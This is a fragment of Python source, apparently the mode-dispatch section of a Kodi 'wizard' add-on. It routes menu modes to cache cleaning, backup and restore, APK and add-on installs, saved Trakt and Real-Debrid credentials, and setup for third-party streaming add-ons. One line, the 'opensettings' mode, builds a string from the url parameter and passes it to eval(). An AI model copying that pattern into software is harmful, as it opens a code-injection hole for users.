elif mode =='oldThumbs':wiz .oldThumbs ()#line:5531
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5532
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5533
elif mode =='currentsettings':viewAdvanced ()#line:5534
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5535
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5536
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5537
elif mode =='fixskin':backtokodi ()#line:5538
elif mode =='testcommand':testcommand ()#line:5539
elif mode =='logsend':logsend ()#line:5540
elif mode =='rdon':rdon ()#line:5541
elif mode =='rdoff':rdoff ()#line:5542
elif mode =='setrd':setrealdebrid ()#line:5543
elif mode =='setrd2':setautorealdebrid ()#line:5544
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5545
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5546
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5547
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5548
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5549
elif mode =='freshstart':freshStart ()#line:5550
elif mode =='forceupdate':wiz .forceUpdate ()#line:5551
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5552
elif mode =='forceclose':wiz .killxbmc ()#line:5553
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5554
elif mode =='hidepassword':wiz .hidePassword ()#line:5555
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5556
elif mode =='enableaddons':enableAddons ()#line:5557
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5558
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5559
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5560
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5561
elif mode =='uploadlog':uploadLog .Main ()#line:5562
elif mode =='viewlog':LogViewer ()#line:5563
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5564
elif mode =='viewerrorlog':errorChecking (all =True )#line:5565
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5566
elif mode =='purgedb':purgeDb ()#line:5567
elif mode =='fixaddonupdate':fixUpdate ()#line:5568
elif mode =='removeaddons':removeAddonMenu ()#line:5569
elif mode =='removeaddon':removeAddon (name )#line:5570
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5571
elif mode =='removedata':removeAddonData (name )#line:5572
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5573
elif mode =='systeminfo':systemInfo ()#line:5574
elif mode =='restorezip':restoreit ('build')#line:5575
elif mode =='restoregui':restoreit ('gui')#line:5576
elif mode =='restoreaddon':restoreit ('addondata')#line:5577
elif mode =='restoreextzip':restoreextit ('build')#line:5578
elif mode =='restoreextgui':restoreextit ('gui')#line:5579
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5580
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5581
elif mode =='traktsync':traktsync ()#line:5582
elif mode =='apk':apkMenu (name )#line:5584
elif mode =='apkscrape':apkScraper (name )#line:5585
elif mode =='apkinstall':apkInstaller (name ,url )#line:5586
elif mode =='speed':speedMenu ()#line:5587
elif mode =='net':net_tools ()#line:5588
elif mode =='GetList':GetList (url )#line:5589
elif mode =='youtube':youtubeMenu (name )#line:5590
elif mode =='viewVideo':playVideo (url )#line:5591
elif mode =='addons':addonMenu (name )#line:5593
elif mode =='addoninstall':addonInstaller (name ,url )#line:5594
elif mode =='savedata':saveMenu ()#line:5596
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5597
elif mode =='managedata':manageSaveData (name )#line:5598
elif mode =='whitelist':wiz .whiteList (name )#line:5599
elif mode =='trakt':traktMenu ()#line:5601
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5602
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5603
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5604
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5605
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5606
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5607
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5608
elif mode =='realdebrid':realMenu ()#line:5610
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5611
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5612
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5613
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5614
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5615
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5616
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5617
elif mode =='login':loginMenu ()#line:5619
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5620
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5621
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5622
elif mode =='clearlogin':loginit .clearSaved (name )#line:5623
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5624
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5625
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5626
elif mode =='contact':notify .contact (CONTACT )#line:5628
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5629
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5630
elif mode =='developer':developer ()#line:5632
elif mode =='converttext':wiz .convertText ()#line:5633
elif mode =='createqr':wiz .createQR ()#line:5634
elif mode =='testnotify':testnotify ()#line:5635
elif mode =='testnotify2':testnotify2 ()#line:5636
elif mode =='servicemanual':servicemanual ()#line:5637
elif mode =='fastinstall':fastinstall ()#line:5638
elif mode =='testupdate':testupdate ()#line:5639
elif mode =='testfirst':testfirst ()#line:5640
elif mode =='testfirstrun':testfirstRun ()#line:5641
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5642
elif mode =='bg':wiz .bg_install (name ,url )#line:5644
elif mode =='bgcustom':wiz .bg_custom ()#line:5645
elif mode =='bgremove':wiz .bg_remove ()#line:5646
elif mode =='bgdefault':wiz .bg_default ()#line:5647
elif mode =='rdset':rdsetup ()#line:5648
elif mode =='mor':morsetup ()#line:5649
elif mode =='mor2':morsetup2 ()#line:5650
elif mode =='resolveurl':resolveurlsetup ()#line:5651
elif mode =='urlresolver':urlresolversetup ()#line:5652
elif mode =='forcefastupdate':forcefastupdate ()#line:5653
elif mode =='traktset':traktsetup ()#line:5654
elif mode =='placentaset':placentasetup ()#line:5655
elif mode =='flixnetset':flixnetsetup ()#line:5656
elif mode =='reptiliaset':reptiliasetup ()#line:5657
elif mode =='yodasset':yodasetup ()#line:5658
elif mode =='numbersset':numberssetup ()#line:5659
elif mode =='uranusset':uranussetup ()#line:5660
elif mode =='genesisset':genesissetup ()#line:5661
elif mode =='fastupdate':fastupdate ()#line:5662
elif mode =='folderback':folderback ()#line:5663
elif mode =='menudata':Menu ()#line:5664
elif mode ==2 :#line:5666
        wiz .torent_menu ()#line:5667
elif mode ==3 :#line:5668
        wiz .popcorn_menu ()#line:5669
elif mode ==8 :#line:5670
        wiz .metaliq_fix ()#line:5671
elif mode ==9 :#line:5672
        wiz .quasar_menu ()#line:5673
elif mode ==5 :#line:5674
        swapSkins ('skin.Premium.mod')#line:5675
elif mode ==13 :#line:5676
        wiz .elementum_menu ()#line:5677
elif mode ==16 :#line:5678
        wiz .fix_wizard ()#line:5679
elif mode ==17 :#line:5680
        wiz .last_play ()#line:5681
elif mode ==18 :#line:5682
        wiz .normal_metalliq ()#line:5683
elif mode ==19 :#line:5684
        wiz .fast_metalliq ()#line:5685
elif mode ==20 :#line:5686
        wiz .fix_buffer2 ()#line:5687
elif mode ==21 :#line:5688
        wiz .fix_buffer3 ()#line:5689
elif mode ==11 :#line:5690
        wiz .fix_buffer ()#line:5691
elif mode ==15 :#line:5692
        wiz .fix_font ()#line:5693
elif mode ==14 :#line:5694
        wiz .clean_pass ()#line:5695
elif mode ==22 :#line:5696
        wiz .movie_update ()#line:5697
elif mode =='adv_settings':buffer1 ()#line:5698
elif mode =='getpass':getpass ()#line:5699
elif mode =='setpass':setpass ()#line:5700
elif mode =='setuname':setuname ()#line:5701
elif mode =='passandUsername':passandUsername ()#line:5702
elif mode =='9':disply_hwr ()#line:5703
elif mode =='99':disply_hwr2 ()#line:5704
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))